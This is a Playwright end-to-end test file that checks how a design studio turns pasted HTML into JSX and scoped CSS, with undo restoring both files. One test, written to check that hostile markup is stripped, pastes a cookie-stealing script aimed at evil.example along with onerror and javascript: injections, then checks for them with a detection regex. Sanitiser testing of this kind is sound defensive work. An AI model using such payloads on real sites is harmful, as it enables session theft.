import { expect, test, type Page } from '@playwright/test'
import * as fs from 'node:fs'
import * as path from 'node:path'
import { canvasContentFrame } from './helpers/canvasIframe'
import {
  selectInFrame,
  createAuthoredFixtureProject,
  frameForPage,
  openFixtureBoard,
  readToastRecorder,
  removeFixtureProject,
  sourceNodeId,
  startToastRecorder,
  type FixtureProject,
} from './helpers/studioFixtureProject'

/**
 * G-10 - pasting HTML onto a board backed by real files, in a real Chromium,
 * with the REAL OS clipboard and a real ⌘V keystroke.
 *
 * It used to refuse ("a block of HTML has no single honest form to write
 * there"). Now the markup is converted to intrinsic JSX, its `<style>` goes into
 * the stylesheet the page imports (or the CSS Module it imports), and both land
 * as ONE write whose ⌘Z is the undo journal's `restore`. Asserted on the FILES
 * on disk, byte for byte:
 *
 *   1. the elements are in the page's JSX (`className`, a `style` object, a
 *      self-closed `<img />`), the scoped rules are in `trails.css`, and a rule
 *      that would restyle the user's whole app (`a { ... }`) is not;
 *   2. one ⌘Z puts BOTH files back exactly;
 *   3. hostile markup never reaches either file;
 *   4. a page that imports a CSS Module reaches the pasted classes through its
 *      own binding (`styles.badge`).
 *
 * Nothing is synthesised: the HTML is written with the async Clipboard API
 * (permissions granted to the context), and the paste is a keystroke.
 *
 * SAFETY - this spec WRITES, so every case authors its own fixture under this
 * run's throwaway copy of `studio-workspace/` and removes it afterwards.
 */

const TRAILS_PAGE = `import './trails.css'

export default function Trails() {
  return (
    <main className="trails" style={{ display: "flex", flexDirection: "column", gap: "16px", padding: "32px", minHeight: "480px" }}>
      <h1 className="trails__title">Trail report</h1>
      <p className="trails__note">Select me, then paste.</p>
    </main>
  )
}
`
const TRAILS_CSS = `.trails__title {
  font-size: 28px;
}

.trails__note {
  color: #57534e;
}
`
const CAMP_PAGE = `import styles from './Camp.module.css'

export default function Camp() {
  return (
    <main className={styles.camp}>
      <h1>Camp nights</h1>
      <p id="anchor">Select me, then paste.</p>
    </main>
  )
}
`
const CAMP_CSS = `.camp {
  display: flex;
  flex-direction: column;
  gap: 16px;
  padding: 32px;
  min-height: 480px;
}
`

const TRAILS = 'pages/Trails.jsx'
const TRAILS_STYLES = 'pages/trails.css'
const CAMP = 'pages/Camp.jsx'
const CAMP_STYLES = 'pages/Camp.module.css'

let fixture: FixtureProject
const read = (rel: string) => fs.readFileSync(path.join(fixture.dir, ...rel.split('/')), 'utf8')

test.beforeEach(() => {
  fixture = createAuthoredFixtureProject('__e2e-paste-html', {
    [TRAILS]: TRAILS_PAGE,
    [TRAILS_STYLES]: TRAILS_CSS,
    [CAMP]: CAMP_PAGE,
    [CAMP_STYLES]: CAMP_CSS,
    'package.json': JSON.stringify({ name: 'paste-html-fixture', private: true, type: 'module' }, null, 2) + '\n',
    '.studio/meta.json':
      JSON.stringify(
        {
          displayName: 'Zz Paste Html Fixture',
          platform: 'web',
          pagesDir: 'pages',
          frameDefaults: { width: 900, height: 600 },
          // The DESIGN frame is under test (see canvas-paste.e2e.ts).
          trust: 'static',
        },
        null,
        2,
      ) + '\n',
  })
})

test.afterEach(() => {
  if (fixture) removeFixtureProject(fixture)
})

/** Opens the board and brings `pageId`'s design frame on screen; returns the frame's live content. */
async function openPage(page: Page, pageId: string) {
  await page.context().grantPermissions(['clipboard-read', 'clipboard-write'])
  const canvasRoot = await openFixtureBoard(page, fixture, { autoSave: true })
  await expect(canvasRoot).toBeVisible()
  const boardFrame = await frameForPage(page, canvasRoot, pageId)
  await startToastRecorder(page)
  return canvasContentFrame(boardFrame)
}

/** Put markup on the OS clipboard as `text/html`, as copying from another site does. */
async function copyHtmlToOsClipboard(page: Page, html: string): Promise<void> {
  await page.evaluate(async (markup) => {
    await navigator.clipboard.write([new ClipboardItem({ 'text/html': new Blob([markup], { type: 'text/html' }) })])
  }, html)
}

async function withToasts<T>(page: Page, run: () => Promise<T>): Promise<T> {
  try {
    return await run()
  } catch (error) {
    throw new Error(`${String(error)}\ntoasts: ${JSON.stringify(await readToastRecorder(page))}`, { cause: error })
  }
}

const PLAN_HTML = `<style>
  .plan { padding: 12px 16px; border: 1px solid #d6d3d1; border-radius: 8px }
  .plan a:hover { color: #b91c1c }
  a { color: royalblue }
</style>
<div class="plan" style="background-color: #fff7ed">
  <h2>Sunrise ridge</h2>
  <img src="/ridge.png" alt="Ridge at dawn">
  <a href="/trails/ridge" class="go">Plan the hike</a>
</div>`

test.describe('G-10 - pasting HTML onto a board backed by real files', () => {
  test.setTimeout(240_000)

  test('writes the JSX and the scoped rules, then one ⌘Z puts both files back byte for byte', async ({ page }) => {
    const frame = await openPage(page, 'trails')
    await selectInFrame(page, frame.locator(`[data-node-id="${sourceNodeId(TRAILS_PAGE, TRAILS, 'p')}"]`).first())
    await copyHtmlToOsClipboard(page, PLAN_HTML)

    await page.keyboard.press('Control+v')

    await withToasts(page, async () => {
      await expect
        .poll(() => read(TRAILS), { timeout: 60_000, message: 'the pasted HTML never reached the page source' })
        .toContain('<h2>Sunrise ridge</h2>')
    })
    const pasted = read(TRAILS)
    expect(pasted).toContain('<div className="plan" style={{ backgroundColor: "#fff7ed" }}>')
    expect(pasted).toContain('<img src="/ridge.png" alt="Ridge at dawn" />')
    expect(pasted).toContain('<a href="/trails/ridge" className="go">Plan the hike</a>')
    expect(pasted).toContain('<p className="trails__note">Select me, then paste.</p>')

    const styles = read(TRAILS_STYLES)
    expect(styles.startsWith(TRAILS_CSS)).toBe(true)
    expect(styles).toContain('.plan {')
    expect(styles).toContain('.plan a:hover {')
    // `a { color: royalblue }` would restyle the whole app: it is skipped, not written.
    expect(styles).not.toContain('royalblue')

    await page.keyboard.press('Control+z')
    await withToasts(page, async () => {
      await expect.poll(() => read(TRAILS), { timeout: 60_000, message: 'undo never restored the page' }).toBe(TRAILS_PAGE)
    })
    expect(read(TRAILS_STYLES), 'undo left the pasted rules behind').toBe(TRAILS_CSS)
  })

  test('hostile markup (script, onerror, a javascript: link) never reaches the files', async ({ page }) => {
    const frame = await openPage(page, 'trails')
    await selectInFrame(page, frame.locator(`[data-node-id="${sourceNodeId(TRAILS_PAGE, TRAILS, 'p')}"]`).first())
    await copyHtmlToOsClipboard(
      page,
      '<div class="safe"><script>fetch("https://evil.example/?c="+document.cookie)</script><img src="x" alt="x" onerror="alert(1)"><a href="javascript:alert(2)">click</a><b>kept</b></div>',
    )

    await page.keyboard.press('Control+v')

    await withToasts(page, async () => {
      await expect.poll(() => read(TRAILS), { timeout: 60_000, message: 'the cleaned HTML never reached the page' }).toContain('<b>kept</b>')
    })
    for (const file of [TRAILS, TRAILS_STYLES]) {
      expect(read(file), `${file} carries something hostile`).not.toMatch(/evil\.example|onerror|alert\(|javascript:|<script/i)
    }
  })

  test('a page that imports a CSS Module reaches the pasted classes through its own binding', async ({ page }) => {
    const frame = await openPage(page, 'camp')
    await selectInFrame(page, frame.locator('#anchor').first())
    await copyHtmlToOsClipboard(page, '<style>.badge { padding: 4px 10px; border-radius: 99px }</style><span class="badge">Full</span>')

    await page.keyboard.press('Control+v')

    await withToasts(page, async () => {
      await expect.poll(() => read(CAMP), { timeout: 60_000, message: 'the pasted badge never reached the page source' }).toContain('styles.badge')
    })
    expect(read(CAMP)).toContain('<span className={styles.badge}>Full</span>')
    expect(read(CAMP_STYLES).startsWith(CAMP_CSS)).toBe(true)
    expect(read(CAMP_STYLES)).toContain('.badge {')
  })
})
